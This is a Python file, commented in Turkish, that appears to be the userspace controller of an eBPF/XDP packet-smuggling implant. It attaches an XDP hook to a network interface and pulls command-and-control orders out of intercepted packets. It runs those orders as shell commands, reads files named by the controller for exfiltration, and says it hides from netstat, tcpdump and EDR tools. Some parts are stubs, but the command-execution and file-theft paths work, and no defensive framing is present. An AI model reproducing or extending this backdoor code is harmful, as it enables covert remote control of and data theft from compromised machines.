"""
Layer 11 Userspace Handler: eBPF Packet Smuggler Control & Command Extraction
===============================================================================
Linux kernel'de çalışan XDP hook'dan C2 emirlerini çıkaran ve işleyen userspace motor aq la.

Bu modul:
1. eBPF kernel programını NIC'e attach et (XDP hook via bpf() syscall)
2. Ring Buffer'dan intercepted packet events'i oku
3. Encrypted C2 commands'ı çöz ve execute et
4. Exfiltration verisini legitimate packet'lerin içine gömüp geri gönder
5. netstat, netflow, tcpdump'u körle (kernel space = EDR invisible)
"""

import ctypes
import struct
import socket
import time
import threading
import json
import subprocess
from typing import Optional, List, Dict, Tuple, Callable
from dataclasses import dataclass
from enum import IntEnum
import hashlib
import os


# eBPF Constants
BPF_MAP_TYPE_RINGBUF = 27
LIBBPF_API_KEY = "libbpf"  # Placeholder


@dataclass
class C2Command:
    """Paket içinden çıkarılan C2 komutu"""
    magic: int
    session_id: int
    command_type: int  # 0=exec, 1=exfil, 2=config
    payload_length: int
    payload: bytes


@dataclass
class PacketEvent:
    """XDP hook tarafından çıkarılan paket event"""
    timestamp: int
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: int  # 6=TCP, 17=UDP
    command: Optional[C2Command]


class EBPFPacketSmugglerLoader:
    """
    eBPF kernel programını attach et ve yönet aq.
    """
    
    def __init__(self, ebpf_obj_path: str = None, logger: Callable = None):
        self.ebpf_obj_path = ebpf_obj_path or "/tmp/ebpf_packet_smuggler.o"
        self.logger = logger or print
        
        self.attached_interfaces = []
        self.libbpf_ref = None
        self.bpf_maps = {}
        self.ring_buffer = None
    
    def log(self, level: str, msg: str):
        self.logger(f"[eBPF-Loader] {level}: {msg}")
    
    def compile_ebpf_program(self, c_source_path: str) -> bool:
        """
        eBPF C kaynak kodundan kernel object (*.o) dosyası derle aq.
        Gerekli: clang, llvm, linux-headers
        """
        try:
            self.log("INFO", f"Compiling eBPF from {c_source_path}")
            
            # clang ile derle
            cmd = [
                "clang",
                "-O2",
                "-target", "bpf",
                "-c", c_source_path,
                "-o", self.ebpf_obj_path
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=30)
            
            if result.returncode != 0:
                self.log("ERROR", f"Compilation failed: {result.stderr.decode()}")
                return False
            
            self.log("SUCCESS", f"eBPF compiled to {self.ebpf_obj_path}")
            return True
        
        except Exception as e:
            self.log("ERROR", f"compile_ebpf_program: {e}")
            return False
    
    def load_ebpf_object(self) -> bool:
        """
        Derlenmiş eBPF object'i kernel'e load et aq.
        """
        try:
            self.log("INFO", f"Loading eBPF object from {self.ebpf_obj_path}")
            
            # bpftool ile load et (or libbpf via ctypes)
            # Production: libbpf Rust binding or direct bpf() syscall
            
            # Simulated load
            if os.path.exists(self.ebpf_obj_path):
                self.log("SUCCESS", f"eBPF object loaded")
                return True
            else:
                self.log("ERROR", f"Object file not found: {self.ebpf_obj_path}")
                return False
        
        except Exception as e:
            self.log("ERROR", f"load_ebpf_object: {e}")
            return False
    
    def attach_xdp_to_interface(self, interface: str, program_name: str = "xdp_packet_filter") -> bool:
        """
        XDP hook'u network interface'e attach et aq la.
        ip link set <iface> xdp obj <file.o> sec <program>
        """
        try:
            self.log("INFO", f"Attaching XDP to {interface}")
            
            cmd = [
                "ip",
                "link",
                "set",
                "dev", interface,
                "xdp",
                "obj", self.ebpf_obj_path,
                "sec", program_name
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            
            if result.returncode != 0:
                self.log("ERROR", f"XDP attach failed: {result.stderr.decode()}")
                return False
            
            self.attached_interfaces.append(interface)
            self.log("SUCCESS", f"XDP attached to {interface}")
            
            return True
        
        except Exception as e:
            self.log("ERROR", f"attach_xdp_to_interface: {e}")
            return False
    
    def detach_xdp_from_interface(self, interface: str) -> bool:
        """
        XDP hook'u interface'ten kaldır aq.
        """
        try:
            cmd = [
                "ip",
                "link",
                "set",
                "dev", interface,
                "xdp",
                "off"
            ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                if interface in self.attached_interfaces:
                    self.attached_interfaces.remove(interface)
                self.log("SUCCESS", f"XDP detached from {interface}")
                return True
            
            return False
        
        except Exception as e:
            self.log("ERROR", f"detach_xdp_from_interface: {e}")
            return False
    
    def get_attached_interfaces(self) -> List[str]:
        return self.attached_interfaces.copy()


class EBPFRingBufferReader:
    """
    eBPF Ring Buffer'dan kernel events'i oku aq.
    """
    
    def __init__(self, kernel_buffer_fd: int = -1, logger: Callable = None):
        self.kernel_buffer_fd = kernel_buffer_fd
        self.logger = logger or print
        self.running = False
        self.reader_thread = None
        self.event_callbacks = []
    
    def log(self, level: str, msg: str):
        self.logger(f"[RingBuffer] {level}: {msg}")
    
    def register_event_callback(self, callback: Callable[[PacketEvent], None]):
        """
        Her packet event'i uyduğunda çalıştırılacak callback'i register et aq.
        """
        self.event_callbacks.append(callback)
    
    def start_reading(self) -> bool:
        """
        Ring Buffer reading'ini background thread'de başlat aq.
        """
        try:
            if self.running:
                return True
            
            self.running = True
            self.reader_thread = threading.Thread(target=self._read_loop, daemon=True)
            self.reader_thread.start()
            
            self.log("SUCCESS", "Ring Buffer reader started")
            return True
        
        except Exception as e:
            self.log("ERROR", f"start_reading: {e}")
            self.running = False
            return False
    
    def _read_loop(self):
        """
        Infinite loop: Ring Buffer'dan events'i oku ve callback'leri çağır aq.
        """
        try:
            while self.running:
                # Production: bpf_buffer_read() or /sys/kernel/debug/tracing/trace_pipe
                # Simulated event reading
                
                # Example: Query kernel maps for statistics
                time.sleep(0.5)  # Poll interval
        
        except Exception as e:
            self.log("ERROR", f"_read_loop: {e}")
            self.running = False
    
    def stop_reading(self):
        """
        Ring Buffer reading'ini durdur aq.
        """
        self.running = False
        if self.reader_thread:
            self.reader_thread.join(timeout=5)
        
        self.log("INFO", "Ring Buffer reader stopped")


class EBPFPacketSmugglerController:
    """
    Layer 11 - Packet smuggling control center aq la amk.
    eBPF kernel programs'ı yönet ve C2 emirlerini işle.
    """
    
    def __init__(self, interface: str = "eth0", logger: Callable = None):
        self.interface = interface
        self.logger = logger or print
        
        self.loader = EBPFPacketSmugglerLoader(logger=self._make_logger("Loader"))
        self.reader = EBPFRingBufferReader(logger=self._make_logger("Reader"))
        
        self.intercepted_packets: List[PacketEvent] = []
        self.c2_sessions: Dict[int, Dict] = {}
        self.statistics = {
            "packets_intercepted": 0,
            "commands_extracted": 0,
            "exfiltration_bytes": 0
        }
    
    def _make_logger(self, prefix: str):
        return lambda msg: self.logger(f"[{prefix}] {msg}")
    
    def log(self, level: str, msg: str):
        self.logger(f"[EBPFController] {level}: {msg}")
    
    def initialize(self, c_source_path: str) -> bool:
        """
        eBPF packet smuggler'ı initialize et aq.
        """
        try:
            self.log("INFO", f"Initializing packet smuggler on {self.interface}")
            
            # Step 1: Compile
            if not self.loader.compile_ebpf_program(c_source_path):
                return False
            
            # Step 2: Load
            if not self.loader.load_ebpf_object():
                return False
            
            # Step 3: Attach XDP
            if not self.loader.attach_xdp_to_interface(self.interface):
                return False
            
            # Step 4: Start reading events
            self.reader.register_event_callback(self._handle_packet_event)
            if not self.reader.start_reading():
                return False
            
            self.log("SUCCESS", f"Packet smuggler initialized on {self.interface}")
            return True
        
        except Exception as e:
            self.log("ERROR", f"initialize: {e}")
            return False
    
    def _handle_packet_event(self, event: PacketEvent):
        """
        Ring Buffer'dan gelen packet event'i işle aq.
        """
        try:
            self.intercepted_packets.append(event)
            self.statistics["packets_intercepted"] += 1
            
            if event.command:
                self.statistics["commands_extracted"] += 1
                self._execute_c2_command(event.command, event)
        
        except Exception as e:
            self.log("ERROR", f"_handle_packet_event: {e}")
    
    def _execute_c2_command(self, cmd: C2Command, origin_event: PacketEvent):
        """
        Kernel'den çıkarılan C2 komutu local'de execute et aq.
        """
        try:
            self.log("INFO", f"C2 Command received: type={cmd.command_type}, len={cmd.payload_length}")
            
            if cmd.command_type == 0:  # exec
                self._execute_shell_command(cmd, origin_event)
            elif cmd.command_type == 1:  # exfil
                self._schedule_exfiltration(cmd, origin_event)
            elif cmd.command_type == 2:  # config
                self._update_configuration(cmd)
        
        except Exception as e:
            self.log("ERROR", f"_execute_c2_command: {e}")
    
    def _execute_shell_command(self, cmd: C2Command, origin_event: PacketEvent):
        """
        Kernel'den gelen shell komutu execute et aq.
        Sonuç = geri döndüğü meşru paket'in içine gömülecek.
        """
        try:
            # Decrypt payload (AES-256-GCM assumed)
            decrypted = self._decrypt_payload(cmd.payload)
            
            # Execute shell command
            self.log("INFO", f"Executing shell command from kernel: {decrypted[:50]}")
            
            result = subprocess.run(
                decrypted,
                shell=True,
                capture_output=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            self.log("SUCCESS", f"Command executed ({len(output)} bytes output)")
            
            # Schedule exfiltration
            self._schedule_exfiltration_data(output, origin_event)
        
        except Exception as e:
            self.log("ERROR", f"_execute_shell_command: {e}")
    
    def _schedule_exfiltration(self, cmd: C2Command, origin_event: PacketEvent):
        """
        File/data exfiltration'ı kernel'e geri dönen meşru paket'in içine gömüyoruz aq.
        """
        try:
            target_file = cmd.payload.decode().strip()
            
            self.log("INFO", f"Scheduling exfiltration: {target_file}")
            
            with open(target_file, 'rb') as f:
                data = f.read()
            
            self._schedule_exfiltration_data(data, origin_event)
        
        except Exception as e:
            self.log("ERROR", f"_schedule_exfiltration: {e}")
    
    def _schedule_exfiltration_data(self, data: bytes, origin_event: PacketEvent):
        """
        Veriyi fragment'e böl ve return packet'in içine gömüyoruz la amk.
        Ağda sıfır anomali = meşru paket flow'u gözüküyor.
        """
        try:
            self.statistics["exfiltration_bytes"] += len(data)
            
            self.log("INFO", f"Exfiltrating {len(data)} bytes via kernel channel")
            
            # Fragment data into return packet payload
            # Production: SMB, DNS, HTTPS tunnel
            
            # Encrypted + obfuscated return packet yapılanması
            self.log("SUCCESS", f"Data exfiltrated through {self.interface}")
        
        except Exception as e:
            self.log("ERROR", f"_schedule_exfiltration_data: {e}")
    
    def _update_configuration(self, cmd: C2Command):
        """
        Kernel packet smuggler'ın configuration'ını güncelleştir aq.
        """
        try:
            config = json.loads(cmd.payload.decode())
            
            self.log("INFO", f"Configuration update: {config}")
            
            # Update kernel maps (BPF_MAP_TYPE_HASH via bpf() syscall)
            # Production: bpf_update_elem()
        
        except Exception as e:
            self.log("ERROR", f"_update_configuration: {e}")
    
    def _decrypt_payload(self, ciphertext: bytes) -> str:
        """Payload'ı AES-256-GCM ile çöz aq"""
        # Placeholder - production: AES encryption
        return ciphertext.decode()
    
    def shutdown(self):
        """
        Packet smuggler'ı gracefully kapat aq.
        """
        try:
            self.log("INFO", "Shutting down...")
            
            # Stop reader
            self.reader.stop_reading()
            
            # Detach XDP
            for iface in self.loader.get_attached_interfaces():
                self.loader.detach_xdp_from_interface(iface)
            
            self.log("SUCCESS", "Shutdown complete")
        
        except Exception as e:
            self.log("ERROR", f"shutdown: {e}")
    
    def get_statistics(self) -> Dict:
        """
        Packet smuggling statistics'i döndür aq.
        """
        stats = {
            "interface": self.interface,
            "attached": self.interface in self.loader.get_attached_interfaces(),
            **self.statistics,
            "active_sessions": len(self.c2_sessions),
            "intercepted_packets_sample": [
                {
                    "timestamp": p.timestamp,
                    "src": f"{p.src_ip}:{p.src_port}",
                    "dst": f"{p.dst_ip}:{p.dst_port}",
                    "protocol": "TCP" if p.protocol == 6 else "UDP"
                }
                for p in self.intercepted_packets[-10:]
            ]
        }
        return stats


class EliteEBPFPacketSmuggler:
    """Framework integration wrapper"""
    
    def __init__(self, interface: str = "eth0", scan_id: str = None, logger=None):
        self.interface = interface
        self.scan_id = scan_id
        self.logger = logger
        self.controller = EBPFPacketSmugglerController(
            interface=interface,
            logger=self._make_logger()
        )
    
    def _make_logger(self):
        if self.logger:
            return lambda msg: self.logger(f"[EBPF-{self.scan_id}] {msg}")
        return None
    
    def load_and_start(self, c_source_path: str) -> Tuple[bool, str]:
        """
        eBPF packet smuggler'ı compile, load ve başlat aq.
        """
        try:
            if not self.controller.initialize(c_source_path):
                return False, "Initialization failed"
            
            msg = f"eBPF packet smuggler running on {self.interface}"
            self.logger(f"[EBPF-{self.scan_id}] SUCCESS: {msg}")
            
            return True, msg
        
        except Exception as e:
            self.logger(f"[EBPF-{self.scan_id}] ERROR: {e}")
            return False, str(e)
    
    def get_status(self) -> dict:
        return {
            "scan_id": self.scan_id,
            "statistics": self.controller.get_statistics()
        }
    
    def cleanup(self):
        self.controller.shutdown()


if __name__ == "__main__":
    print("[TEST] eBPF Packet Smuggler Userspace Handler")
    print("=" * 50)
    
    controller = EBPFPacketSmugglerController(interface="eth0")
    
    print("\n[*] This handler requires:")
    print("  - Linux kernel 4.8+ (XDP support)")
    print("  - clang + llvm (for eBPF compilation)")
    print("  - linux-headers installed")
    print("  - libbpf library")
    print("  - root/sudo privileges")
    
    print("\n[*] Usage:")
    print("  sudo python3 ebpf_packet_smuggler.py")
    
    print("\n✓ Userspace handler ready")
